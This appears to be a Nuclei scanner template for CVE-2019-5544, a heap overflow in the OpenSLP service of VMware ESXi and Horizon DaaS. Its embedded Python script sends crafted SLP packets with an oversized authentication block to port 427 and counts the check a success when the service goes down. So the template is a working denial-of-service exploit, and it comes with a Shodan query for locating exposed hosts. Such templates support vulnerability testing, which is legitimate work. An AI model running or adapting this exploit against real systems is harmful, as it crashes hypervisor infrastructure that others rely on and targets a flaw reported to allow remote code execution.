id: CVE-2019-5544

info:
  name: VMware ESXi SLP - Heap Overflow DoS (CVE-2019-5544)
  author: riteshs4hu
  severity: critical
  description: |
    OpenSLP in ESXi and Horizon DaaS appliances contains a heap overwrite caused by a vulnerability in the OpenSLP component, letting DoS and remote attackers execute arbitrary code.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2019-5544
    - https://github.com/dgh05t/VMware_ESXI_OpenSLP_PoCs
  metadata:
    verified: true
    max-request: 1
    shodan-query:
      - http.title:"horizon daas"
    tags: cve,cve2019,vmware,esxi,overflow,dos

variables:
  target: "{{Hostname}}"

code:
  - engine:
      - python3
    source: |
      import socket
      import os
      import time

      target = os.environ.get("target", "127.0.0.1")
      serverAddr = (target, 427)

      def is_port_open(address, port, timeout=3):
          sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
          sock.settimeout(timeout)
          result = sock.connect_ex((address, port))
          sock.close()
          return result == 0

      if not is_port_open(target, 427):
          print(f"Port 427 is closed or filtered on {target}")
      else:
          # Prepare malicious payloads
          header = b"\x02"  + b"\x03" + b"\x00\x10\x5e" + b"\x00\x00" + b"\x00\x00\x00" + b"\x66\x0d" + b"\x00\x02" + b"\x65\x6e"
          UrlEntry1 = b"\x00" + b"\x10\x00" + b"\x00\x14" + b"http://www.baidu.com" + b"\x01"
          authblock = b"\x00\x00" + b"\x10\x00" + b"\x01\x01\x01\x01" + b"\x0f\xf6" + b"y" * 0xff6
          service_type = b"\x00\x1c" + b"service:VMwareInfrastructure"
          scope_list = b"\x00\x07" + b"default"
          attribute_list = b"\x00\x0a" + b"pppppppppp"
          authcount = b"\x00"
          poc_1 = header + UrlEntry1 + authblock + service_type + scope_list + attribute_list + authcount

          header = b"\x02" + b"\x01" + b"\x00\x00\x47" + b"\x00\x00" + b"\x00\x00\x00" + b"\x00\x00" + b"\x00\x02" + b"\x65\x6e"
          srvrqst = (
              b"\x00\x0a" + b"1234567890" +
              b"\x00\x1c" + b"service:VMwareInfrastructure" +
              b"\x00\x07" + b"default" +
              b"\x00\x00" + b"\x00\x00"
          )
          poc_2 = header + srvrqst

          tcpClientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
          try:
              tcpClientSocket.connect(serverAddr)
              tcpClientSocket.send(poc_1)
              tcpClientSocket.send(poc_2)
              tcpClientSocket.close()
              time.sleep(2)
              if not is_port_open(target, 427):
                  print("success!")
              else:
                  print("not closed")
          except ConnectionRefusedError:
              print("connection refused")

    matchers:
      - type: word
        words:
          - "success!"
# digest: 4b0a00483046022100efc389c9eb6e48aa1c1e2d6be348b0606a1c41536b360701be62498345575ca4022100af1f90f5aa47cfeb535129058ff0cecdecb841dd60d95c37d10662b10ddb62d2:e68ba7c09b3cfa8cfd81e2c1f06c37c6
